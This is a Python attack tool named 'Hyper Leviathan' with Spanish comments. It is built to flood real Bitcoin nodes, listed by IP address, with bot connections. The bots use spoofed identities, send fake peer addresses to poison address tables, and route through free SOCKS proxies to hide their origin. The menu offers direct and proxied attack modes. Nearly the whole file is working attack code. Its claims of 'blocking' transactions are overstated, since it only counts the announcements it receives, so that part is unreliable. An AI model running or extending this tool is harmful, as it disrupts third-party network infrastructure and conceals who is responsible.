#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║   HYPER LEVIATHAN v7.0 - AUTO INSTALLER EDITION                       ║
║                                                                       ║
║   Este script instala automáticamente todas las dependencias          ║
║   y ejecuta el ataque.                                                ║
║                                                                       ║
║   Uso: python3 leviathan.py                                           ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import sys
import os

# ============================================================================
#                         AUTO-INSTALLER
# ============================================================================

def install_dependencies():
    """Instala todas las dependencias necesarias"""
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   🔧 INSTALLING DEPENDENCIES...                               ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    dependencies = [
        'pysocks',      # Para proxies SOCKS
        'requests',     # Para descargar listas de proxies
    ]
    
    for dep in dependencies:
        print(f"[*] Installing {dep}...")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', dep, '-q'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[+] ✅ {dep} installed")
        except subprocess.CalledProcessError:
            print(f"[!] ⚠️ Could not install {dep}, continuing anyway...")
    
    print("\n[+] ✅ Dependencies installed!\n")

# Intentar importar, si falla, instalar
try:
    import socks
    import socket
    import struct
    import hashlib
    import time
    import random
    import threading
    import concurrent.futures
    from collections import defaultdict
    from queue import Queue
except ImportError:
    install_dependencies()
    import socks
    import socket
    import struct
    import hashlib
    import time
    import random
    import threading
    import concurrent.futures
    from collections import defaultdict
    from queue import Queue

# Intentar importar requests (opcional)
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ============================================================================
#                         CONFIGURACIÓN
# ============================================================================

# Nodos Bitcoin (IPs directas)
BITCOIN_NODES = [
    ("88.99.167.186", 8333),
    ("95.217.198.121", 8333),
    ("135.181.215.237", 8333),
    ("65.108.70.54", 8333),
    ("95.216.100.80", 8333),
    ("88.198.39.205", 8333),
    ("78.46.73.61", 8333),
    ("159.69.72.189", 8333),
    ("168.119.168.213", 8333),
    ("178.128.221.177", 8333),
    ("139.59.208.176", 8333),
    ("167.172.226.175", 8333),
    ("134.209.30.101", 8333),
    ("167.99.92.197", 8333),
    ("165.22.59.65", 8333),
    ("159.89.137.137", 8333),
    ("68.183.103.46", 8333),
    ("157.245.141.23", 8333),
    ("167.99.142.190", 8333),
    ("134.209.111.187", 8333),
    ("157.230.103.196", 8333),
    ("165.227.17.179", 8333),
    ("138.68.14.176", 8333),
    ("206.189.195.138", 8333),
    ("1.215.249.98", 8333),
    ("107.182.173.165", 8333),
    ("172.233.48.73", 8333),
    ("209.38.162.70", 8333),
    ("174.140.231.57", 8333),
    ("66.163.223.69", 8333),
    ("89.106.27.107", 8333),
    ("103.47.56.1", 8333),
    ("45.37.235.193", 8333),
]

# Seeds DNS (backup)
DNS_SEEDS = [
    'seed.bitcoin.sipa.be',
    'dnsseed.bluematt.me',
    'dnsseed.bitcoin.dashjr.org',
    'seed.bitcoinstats.com',
    'seed.bitcoin.jonasschnelli.ch',
    'seed.btc.petertodd.org',
]

# Fuentes de proxies gratis
PROXY_SOURCES = [
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5',
]

WORKING_NODES = []
MAX_WORKERS = 100

# ============================================================================
#                         ESTADO GLOBAL
# ============================================================================

class LeviathanState:
    def __init__(self):
        self.lock = threading.RLock()
        self.print_lock = threading.Lock()
        self.running = True
        self.active_bots = {}
        self.proxies = []
        
        self.stats = {
            'bots_alive': 0,
            'connections': 0,
            'failed': 0,
            'reconnects': 0,
            'fake_ips': 0,
            'messages_in': 0,
            'messages_out': 0,
            'inv_received': 0,
            'tx_blocked': 0,
            'blocks_blocked': 0,
            'addr_poisoned': 0,
            'bytes_in': 0,
            'bytes_out': 0,
        }
    
    def reset(self):
        self.running = True
        self.active_bots = {}
        for key in self.stats:
            self.stats[key] = 0

STATE = LeviathanState()

# ============================================================================
#                         LOGGING
# ============================================================================

def log(msg, bot_id=None, color=None):
    """Thread-safe colored logging"""
    with STATE.print_lock:
        ts = time.strftime("%H:%M:%S")
        
        colors = {
            'green': '\033[92m',
            'red': '\033[91m',
            'yellow': '\033[93m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'bold': '\033[1m',
            'reset': '\033[0m'
        }
        
        c = colors.get(color, '')
        r = colors['reset'] if color else ''
        
        if bot_id is not None:
            print(f"{c}[{ts}] [Bot {bot_id:>4}] {msg}{r}")
        else:
            print(f"{c}[{ts}] {msg}{r}")
        
        sys.stdout.flush()

# ============================================================================
#                         FAKE IP GENERATOR
# ============================================================================

class FakeIPGenerator:
    """Genera IPs falsas de rangos de ISPs reales"""
    
    ISP_RANGES = [
        # US - Comcast
        (24, 24), (50, 50), (68, 68), (73, 73), (75, 76), (98, 98),
        # US - AT&T
        (12, 12), (32, 32), (99, 99), (107, 108),
        # US - Verizon
        (71, 72), (96, 96),
        # US - Charter
        (66, 67), (74, 74), (97, 97),
        # Europe
        (77, 95), (109, 109), (176, 178), (185, 188),
        # Latin America
        (189, 191), (200, 201),
        # Asia
        (1, 1), (14, 14), (27, 27), (36, 36), (42, 42),
    ]
    
    def __init__(self):
        self.used = set()
        self.lock = threading.Lock()
    
    def generate(self):
        with self.lock:
            for _ in range(100):
                r = random.choice(self.ISP_RANGES)
                ip = f"{random.randint(r[0], r[1])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 253)}"
                
                if ip not in self.used:
                    self.used.add(ip)
                    with STATE.lock:
                        STATE.stats['fake_ips'] += 1
                    return ip
            
            return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 253)}"
    
    def batch(self, count):
        return [self.generate() for _ in range(count)]

FAKE_IP = FakeIPGenerator()

# ============================================================================
#                         PROXY MANAGER
# ============================================================================

class ProxyManager:
    """Gestiona proxies"""
    
    def __init__(self):
        self.proxies = []
        self.failed = set()
        self.lock = threading.Lock()
    
    def fetch_proxies(self):
        """Descarga proxies de internet"""
        if not HAS_REQUESTS:
            log("⚠️ requests not installed, skipping proxy fetch", color='yellow')
            return 0
        
        log("🌐 Fetching proxies from internet...", color='cyan')
        
        all_proxies = set()
        
        for source in PROXY_SOURCES:
            try:
                response = requests.get(source, timeout=10, verify=False)
                if response.status_code == 200:
                    lines = response.text.strip().split('\n')
                    count = 0
                    for line in lines:
                        line = line.strip()
                        if line and ':' in line:
                            try:
                                parts = line.split(':')
                                host = parts[0]
                                port = int(parts[1])
                                
                                ptype = socks.SOCKS5 if 'socks5' in source.lower() else socks.SOCKS4
                                all_proxies.add((host, port, ptype))
                                count += 1
                            except:
                                continue
                    
                    log(f"  [+] {source.split('/')[-1][:25]}: {count}", color='green')
            except:
                log(f"  [-] {source.split('/')[-1][:25]}: failed", color='red')
        
        self.proxies = list(all_proxies)
        random.shuffle(self.proxies)
        
        log(f"✅ Total proxies: {len(self.proxies)}", color='green')
        return len(self.proxies)
    
    def get_random(self):
        with self.lock:
            available = [p for p in self.proxies if (p[0], p[1]) not in self.failed]
            if not available:
                self.failed.clear()
                available = self.proxies
            
            if available:
                return random.choice(available)
            return None
    
    def mark_failed(self, proxy):
        if proxy:
            with self.lock:
                self.failed.add((proxy[0], proxy[1]))
    
    def load_from_file(self, filename):
        """Carga proxies de archivo"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        try:
                            parts = line.split(':')
                            host = parts[0]
                            port = int(parts[1])
                            self.proxies.append((host, port, socks.SOCKS5))
                        except:
                            continue
            log(f"✅ Loaded {len(self.proxies)} proxies from {filename}", color='green')
            return len(self.proxies)
        except FileNotFoundError:
            log(f"❌ File not found: {filename}", color='red')
            return 0

PROXY_MGR = ProxyManager()

# ============================================================================
#                         PROTOCOLO BITCOIN
# ============================================================================

def sha256d(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def make_msg(cmd, payload=b''):
    magic = b'\xf9\xbe\xb4\xd9'
    command = cmd.encode().ljust(12, b'\x00')
    length = struct.pack('<I', len(payload))
    checksum = sha256d(payload)[:4]
    return magic + command + length + checksum + payload

def varint(n):
    if n < 0xfd:
        return bytes([n])
    elif n <= 0xffff:
        return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', n)
    return b'\xff' + struct.pack('<Q', n)

def read_varint(data, pos):
    if pos >= len(data):
        return 0, pos
    b = data[pos]
    if b < 0xfd:
        return b, pos + 1
    elif b == 0xfd:
        return struct.unpack('<H', data[pos+1:pos+3])[0], pos + 3
    elif b == 0xfe:
        return struct.unpack('<I', data[pos+1:pos+5])[0], pos + 5
    return struct.unpack('<Q', data[pos+1:pos+9])[0], pos + 9

def make_version(fake_ip, target_ip):
    version = 70016
    services = 0x0409
    timestamp = int(time.time())
    
    try:
        recv_ip = socket.inet_aton(target_ip)
    except:
        recv_ip = b'\x7f\x00\x00\x01'
    
    addr_recv = struct.pack('<Q', 1) + b'\x00' * 10 + b'\xff\xff' + recv_ip + struct.pack('>H', 8333)
    
    try:
        my_ip = socket.inet_aton(fake_ip)
    except:
        my_ip = b'\x7f\x00\x00\x01'
    
    addr_from = struct.pack('<Q', services) + b'\x00' * 10 + b'\xff\xff' + my_ip + struct.pack('>H', 8333)
    
    nonce = struct.pack('<Q', random.getrandbits(64))
    
    user_agents = [
        b'/Satoshi:27.0.0/',
        b'/Satoshi:26.0.0/',
        b'/Satoshi:25.1.0/',
        b'/Satoshi:25.0.0/',
        b'/Satoshi:24.2.0/',
    ]
    ua = random.choice(user_agents)
    
    height = struct.pack('<i', random.randint(870000, 900000))
    
    payload = struct.pack('<iQq', version, services, timestamp)
    payload += addr_recv + addr_from + nonce
    payload += varint(len(ua)) + ua + height + b'\x01'
    
    return make_msg('version', payload)

def make_verack():
    return make_msg('verack')

def make_ping():
    return make_msg('ping', struct.pack('<Q', random.getrandbits(64)))

def make_pong(nonce):
    return make_msg('pong', nonce)

def make_mempool():
    return make_msg('mempool')

def make_feefilter():
    return make_msg('feefilter', struct.pack('<Q', 0))

def make_sendheaders():
    return make_msg('sendheaders')

def make_getaddr():
    return make_msg('getaddr')

def make_addr(addresses):
    payload = varint(len(addresses))
    
    for ip, port in addresses:
        try:
            ip_bytes = socket.inet_aton(ip)
            payload += struct.pack('<I', int(time.time()) - random.randint(0, 3600))
            payload += struct.pack('<Q', 0x0409)
            payload += b'\x00' * 10 + b'\xff\xff' + ip_bytes
            payload += struct.pack('>H', port)
        except:
            pass
    
    return make_msg('addr', payload)

def parse_inv(payload):
    items = []
    try:
        count, pos = read_varint(payload, 0)
        for _ in range(min(count, 50000)):
            if pos + 36 > len(payload):
                break
            t = struct.unpack('<I', payload[pos:pos+4])[0]
            h = payload[pos+4:pos+36][::-1].hex()[:16]
            pos += 36
            items.append((t, h))
    except:
        pass
    return items

# ============================================================================
#                         BOT LEVIATHAN
# ============================================================================

class LeviathanBot:
    """Bot con soporte de proxy y IP dinámica"""
    
    def __init__(self, bot_id, nodes, use_proxy=False):
        self.id = bot_id
        self.nodes = nodes
        self.use_proxy = use_proxy
        
        self.sock = None
        self.buffer = b''
        self.fake_ip = None
        self.target = None
        self.proxy = None
        self.connected = False
        self.running = False
        
        self.tx_blocked = 0
        self.blocks_blocked = 0
        self.reconnects = 0
    
    def log(self, msg, color=None):
        log(msg, self.id, color)
    
    def new_identity(self):
        self.fake_ip = FAKE_IP.generate()
        self.target = random.choice(self.nodes)
        
        if self.use_proxy and PROXY_MGR.proxies:
            self.proxy = PROXY_MGR.get_random()
    
    def create_socket(self):
        if self.proxy:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(
                proxy_type=self.proxy[2],
                addr=self.proxy[0],
                port=self.proxy[1]
            )
            return sock
        else:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def get_connection_info(self):
        if self.proxy:
            return f"[Proxy {self.proxy[0]}:{self.proxy[1]}] {self.fake_ip} → {self.target[0]}"
        return f"{self.fake_ip} → {self.target[0]}"
    
    def connect(self):
        try:
            self.log(f"🔌 {self.get_connection_info()}")
            
            self.sock = self.create_socket()
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.sock.settimeout(15)
            
            self.sock.connect(self.target)
            
            # Handshake
            self.sock.sendall(make_version(self.fake_ip, self.target[0]))
            
            cmd, _ = self.recv_msg(timeout=15)
            if cmd != 'version':
                raise Exception(f"Expected version, got {cmd}")
            
            self.sock.sendall(make_verack())
            
            # Esperar verack
            got_verack = False
            for _ in range(10):
                try:
                    cmd, payload = self.recv_msg(timeout=5)
                    if cmd == 'verack':
                        got_verack = True
                        break
                    elif cmd == 'ping':
                        self.sock.sendall(make_pong(payload[:8]))
                except socket.timeout:
                    continue
            
            if not got_verack:
                raise Exception("No verack")
            
            # Post-handshake
            self.sock.sendall(make_sendheaders())
            self.sock.sendall(make_feefilter())
            self.sock.sendall(make_mempool())
            self.sock.sendall(make_getaddr())
            
            self.connected = True
            
            with STATE.lock:
                STATE.stats['connections'] += 1
                STATE.stats['bots_alive'] += 1
                STATE.active_bots[self.id] = self
            
            self.log(f"✅ Connected!", color='green')
            return True
            
        except socks.ProxyError as e:
            self.log(f"🔒 Proxy error: {e}", color='red')
            if self.proxy:
                PROXY_MGR.mark_failed(self.proxy)
        except socket.timeout:
            self.log(f"⏰ Timeout", color='yellow')
        except Exception as e:
            self.log(f"❌ {e}", color='red')
        
        with STATE.lock:
            STATE.stats['failed'] += 1
        
        return False
    
    def recv_msg(self, timeout=10):
        self.sock.settimeout(timeout)
        
        while len(self.buffer) < 24:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Closed")
            self.buffer += chunk
            with STATE.lock:
                STATE.stats['bytes_in'] += len(chunk)
        
        while self.buffer[:4] != b'\xf9\xbe\xb4\xd9':
            idx = self.buffer.find(b'\xf9\xbe\xb4\xd9')
            if idx > 0:
                self.buffer = self.buffer[idx:]
            else:
                chunk = self.sock.recv(4096)
                if not chunk:
                    raise ConnectionError("Closed")
                self.buffer = chunk
                with STATE.lock:
                    STATE.stats['bytes_in'] += len(chunk)
        
        cmd = self.buffer[4:16].rstrip(b'\x00').decode('ascii', errors='ignore')
        length = struct.unpack('<I', self.buffer[16:20])[0]
        
        while len(self.buffer) < 24 + length:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Closed")
            self.buffer += chunk
            with STATE.lock:
                STATE.stats['bytes_in'] += len(chunk)
        
        payload = self.buffer[24:24+length]
        self.buffer = self.buffer[24+length:]
        
        with STATE.lock:
            STATE.stats['messages_in'] += 1
        
        return cmd, payload
    
    def handle_inv(self, payload):
        items = parse_inv(payload)
        
        tx_cnt, blk_cnt = 0, 0
        for t, h in items:
            if t in (1, 0x40000001):
                tx_cnt += 1
                self.tx_blocked += 1
            elif t in (2, 0x40000002):
                blk_cnt += 1
                self.blocks_blocked += 1
        
        with STATE.lock:
            STATE.stats['inv_received'] += len(items)
            STATE.stats['tx_blocked'] += tx_cnt
            STATE.stats['blocks_blocked'] += blk_cnt
        
        if tx_cnt > 0 or blk_cnt > 0:
            self.log(f"🚫 BLOCKED: {tx_cnt} TX, {blk_cnt} Blocks (Total: {self.tx_blocked}/{self.blocks_blocked})", color='magenta')
    
    def poison(self, fake_addrs):
        try:
            self.sock.sendall(make_addr(fake_addrs))
            with STATE.lock:
                STATE.stats['addr_poisoned'] += len(fake_addrs)
                STATE.stats['messages_out'] += 1
            self.log(f"🧪 Poisoned: {len(fake_addrs)} addrs", color='cyan')
        except:
            pass
    
    def run(self, duration, fake_addrs=None):
        self.running = True
        self.new_identity()
        
        start = time.time()
        last_poison = 0
        last_ping = 0
        last_status = 0
        
        self.log(f"🚀 Starting ({duration}s)")
        
        while self.running and (time.time() - start) < duration and STATE.running:
            
            if not self.connected:
                if not self.connect():
                    self.reconnects += 1
                    if self.reconnects > 10:
                        self.log(f"💀 Too many failures", color='red')
                        break
                    self.new_identity()
                    with STATE.lock:
                        STATE.stats['reconnects'] += 1
                    time.sleep(random.uniform(1, 3))
                    continue
            
            try:
                now = time.time()
                
                try:
                    cmd, payload = self.recv_msg(timeout=1)
                    
                    if cmd == 'inv':
                        self.handle_inv(payload)
                    elif cmd == 'ping':
                        self.sock.sendall(make_pong(payload[:8]))
                    elif cmd == 'tx':
                        self.tx_blocked += 1
                        with STATE.lock:
                            STATE.stats['tx_blocked'] += 1
                    elif cmd == 'block':
                        self.blocks_blocked += 1
                        with STATE.lock:
                            STATE.stats['blocks_blocked'] += 1
                    
                except socket.timeout:
                    pass
                
                if fake_addrs and (now - last_poison) > 30:
                    self.poison(fake_addrs)
                    last_poison = now
                
                if (now - last_ping) > 60:
                    try:
                        self.sock.sendall(make_ping())
                        with STATE.lock:
                            STATE.stats['messages_out'] += 1
                        last_ping = now
                    except:
                        self.connected = False
                
                if (now - last_status) > 45:
                    elapsed = int(now - start)
                    self.log(f"📊 TX:{self.tx_blocked} Blocks:{self.blocks_blocked} | {duration-elapsed}s left")
                    last_status = now
                
            except Exception as e:
                self.log(f"⚠️ {e}", color='yellow')
                self.connected = False
        
        self.log(f"🏁 Done! TX:{self.tx_blocked} Blocks:{self.blocks_blocked}", color='green')
        self.disconnect()
    
    def disconnect(self):
        self.connected = False
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        
        with STATE.lock:
            STATE.stats['bots_alive'] = max(0, STATE.stats['bots_alive'] - 1)
            if self.id in STATE.active_bots:
                del STATE.active_bots[self.id]

# ============================================================================
#                         FUNCIONES PRINCIPALES
# ============================================================================

def print_stats():
    s = STATE.stats
    mb_in = s['bytes_in'] / (1024 * 1024)
    mb_out = s['bytes_out'] / (1024 * 1024) if 'bytes_out' in s else 0
    
    print("\n" + "═" * 70)
    print("                         📊 LEVIATHAN STATS")
    print("═" * 70)
    print(f"  🟢 Bots Alive:          {s['bots_alive']}")
    print(f"  ✅ Connections:         {s['connections']}")
    print(f"  ❌ Failed:              {s['failed']}")
    print(f"  ♻️  Reconnects:          {s['reconnects']}")
    print(f"  🎭 Fake IPs:            {s['fake_ips']}")
    print(f"  🔒 Proxies Available:   {len(PROXY_MGR.proxies)}")
    print("─" * 70)
    print(f"  📨 Messages IN:         {s['messages_in']}")
    print(f"  📤 Messages OUT:        {s['messages_out']}")
    print(f"  📋 INV Received:        {s['inv_received']}")
    print(f"  💰 TX Blocked:          {s['tx_blocked']}")
    print(f"  ⛏️  Blocks Blocked:      {s['blocks_blocked']}")
    print(f"  🧪 Addrs Poisoned:      {s['addr_poisoned']}")
    print(f"  💾 Data IN:             {mb_in:.2f} MB")
    print("═" * 70)

def scan_nodes():
    """Escanea nodos disponibles"""
    global WORKING_NODES
    
    log("🔍 Scanning Bitcoin nodes...", color='cyan')
    
    working = []
    
    # Primero intentar DNS
    for seed in DNS_SEEDS:
        try:
            ips = socket.gethostbyname_ex(seed)[2]
            for ip in ips:
                working.append((ip, 8333))
            log(f"  [+] {seed}: {len(ips)} IPs", color='green')
        except:
            log(f"  [-] {seed}: DNS failed", color='yellow')
    
    # Luego probar IPs directas
    log("  Testing direct IPs...", color='cyan')
    
    def test_node(node):
        ip, port = node
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            start = time.time()
            sock.connect((ip, port))
            elapsed = (time.time() - start) * 1000
            sock.close()
            return (ip, port, True, elapsed)
        except:
            return (ip, port, False, 0)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = [ex.submit(test_node, n) for n in BITCOIN_NODES]
        
        for future in concurrent.futures.as_completed(futures):
            ip, port, works, ms = future.result()
            if works:
                log(f"  ✅ {ip} ({ms:.0f}ms)", color='green')
                working.append((ip, port))
            else:
                log(f"  ❌ {ip}", color='red')
    
    WORKING_NODES = list(set(working))
    log(f"\n✅ Working nodes: {len(WORKING_NODES)}", color='green')
    
    return WORKING_NODES

def test_connection():
    """Prueba una conexión"""
    nodes = WORKING_NODES if WORKING_NODES else BITCOIN_NODES
    target = random.choice(nodes)
    fake_ip = FAKE_IP.generate()
    
    log(f"🧪 Testing connection to {target[0]}...", color='cyan')
    log(f"   Fake IP: {fake_ip}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect(target)
        
        log("✅ TCP Connected!", color='green')
        
        sock.sendall(make_version(fake_ip, target[0]))
        log("📤 VERSION sent")
        
        sock.settimeout(3)
        start = time.time()
        
        while time.time() - start < 15:
            try:
                data = sock.recv(4096)
                if data and len(data) >= 24:
                    cmd = data[4:16].rstrip(b'\x00').decode('ascii', errors='ignore')
                    log(f"📥 {cmd} ({len(data)} bytes)", color='green')
                    
                    if cmd == 'version':
                        sock.sendall(make_verack())
                        sock.sendall(make_mempool())
                        log("📤 VERACK + MEMPOOL sent")
                    
                    elif cmd == 'inv':
                        log(f"🚫 Got INV - would block this!", color='magenta')
                    
            except socket.timeout:
                continue
        
        sock.close()
        log("✅ Test complete!", color='green')
        return True
        
    except Exception as e:
        log(f"❌ Error: {e}", color='red')
        return False

def launch_attack(num_bots, duration, use_proxy=False):
    """Lanza el ataque"""
    STATE.reset()
    
    nodes = WORKING_NODES if WORKING_NODES else BITCOIN_NODES
    
    print(f"\n{'═' * 70}")
    print(f"    ☠️  LAUNCHING HYPER LEVIATHAN ATTACK")
    print(f"    Bots: {num_bots} | Duration: {duration}s | Nodes: {len(nodes)}")
    print(f"    Proxies: {len(PROXY_MGR.proxies)} | Mode: {'PROXY' if use_proxy else 'DIRECT'}")
    print(f"{'═' * 70}\n")
    
    fake_addrs = [(FAKE_IP.generate(), 8333) for _ in range(50)]
    log(f"🧪 Generated {len(fake_addrs)} fake addresses for poisoning")
    
    STATE.running = True
    
    def run_bot(bot_id):
        bot = LeviathanBot(bot_id, nodes, use_proxy=use_proxy)
        bot.run(duration=duration, fake_addrs=fake_addrs)
    
    def stats_loop():
        while STATE.running:
            time.sleep(20)
            if STATE.running:
                print_stats()
    
    stats_thread = threading.Thread(target=stats_loop, daemon=True)
    stats_thread.start()
    
    workers = min(num_bots, MAX_WORKERS)
    log(f"🚀 Starting {num_bots} bots with {workers} workers...")
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(run_bot, i) for i in range(1, num_bots + 1)]
            concurrent.futures.wait(futures, timeout=duration + 120)
    except KeyboardInterrupt:
        log("⚠️ Interrupted!", color='yellow')
        STATE.running = False
    
    STATE.running = False
    time.sleep(2)
    
    print("\n" + "═" * 70)
    print("               ☠️  ATTACK COMPLETE")
    print_stats()

# ============================================================================
#                         MENÚ PRINCIPAL
# ============================================================================

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                             ║
    ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                            ║
    ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                            ║
    ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                            ║
    ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                            ║
    ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                            ║
    ║                                                                       ║
    ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗║
    ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║║
    ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║║
    ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║║
    ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║║
    ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝║
    ║                                                                       ║
    ║              ⚡ v7.0 - AUTO INSTALLER EDITION ⚡                        ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    
    ┌─────────────────────────────────────────────────────────────────────────┐
    │  [1] 🔍 SCAN NODES        - Find working Bitcoin nodes                  │
    │  [2] 🧪 TEST CONNECTION   - Test single connection                      │
    │  [3] 🌐 FETCH PROXIES     - Download free proxies                       │
    │  [4] 📁 LOAD PROXIES      - Load proxies from file                      │
    │  [5] ☠️  DIRECT ATTACK     - Attack without proxies                      │
    │  [6] 🔒 PROXY ATTACK      - Attack through proxies                      │
    │  [S] 📊 SHOW STATS                                                      │
    │  [0] 🚪 EXIT                                                            │
    └─────────────────────────────────────────────────────────────────────────┘
    """
    print(banner)

def main():
    print_banner()
    
    while True:
        try:
            choice = input("\n[?] Option > ").strip().upper()
            
            if choice == '0':
                log("👋 Goodbye!", color='cyan')
                break
            
            elif choice == '1':
                scan_nodes()
            
            elif choice == '2':
                test_connection()
            
            elif choice == '3':
                PROXY_MGR.fetch_proxies()
            
            elif choice == '4':
                filename = input("[?] Proxy file path > ").strip()
                PROXY_MGR.load_from_file(filename)
            
            elif choice == '5':
                num = int(input("[?] Number of bots > "))
                dur = int(input("[?] Duration (seconds) > "))
                
                if input("[?] Launch? (y/n) > ").lower() == 'y':
                    launch_attack(num, dur, use_proxy=False)
            
            elif choice == '6':
                if not PROXY_MGR.proxies:
                    log("⚠️ No proxies! Fetch or load first.", color='yellow')
                    continue
                
                num = int(input("[?] Number of bots > "))
                dur = int(input("[?] Duration (seconds) > "))
                
                if input("[?] Launch? (y/n) > ").lower() == 'y':
                    launch_attack(num, dur, use_proxy=True)
            
            elif choice == 'S':
                print_stats()
            
            else:
                log("❌ Invalid option", color='red')
                
        except ValueError:
            log("❌ Invalid number", color='red')
        except KeyboardInterrupt:
            log("\n👋 Bye!", color='cyan')
            STATE.running = False
            break
        except Exception as e:
            log(f"❌ Error: {e}", color='red')

if __name__ == "__main__":
    main()